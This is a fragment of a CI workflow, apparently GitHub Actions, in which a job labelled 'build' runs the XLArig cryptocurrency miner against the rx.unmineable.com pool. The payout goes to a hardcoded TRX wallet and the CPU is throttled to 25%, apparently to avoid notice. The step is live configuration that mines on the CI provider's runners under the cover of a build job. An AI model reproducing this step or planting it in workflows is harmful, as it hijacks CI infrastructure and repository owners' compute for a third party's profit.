...
jobs:
  build:
    ...
    - name: Running
      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TRXAjCU48zi732Y1CLTwGr6fYJjBAtvJz4.WORKER
    - name: DONE
      run: exit